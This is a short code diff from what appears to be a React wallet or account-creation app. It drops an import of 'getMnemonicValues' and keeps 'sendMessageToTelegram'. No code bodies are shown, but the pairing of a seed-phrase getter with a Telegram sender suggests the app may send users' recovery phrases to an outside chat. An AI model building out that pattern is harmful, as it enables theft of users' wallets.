@@ -2,7 +2,7 @@
 import { useFormState } from "@/hooks/useFormState";
 import { useState } from "react";
 import {
-  getMnemonicValues,
+ 
   sendMessageToTelegram,
 } from "../create-account/AccountStep2";
 import { FormProvider, useForm } from "react-hook-form";
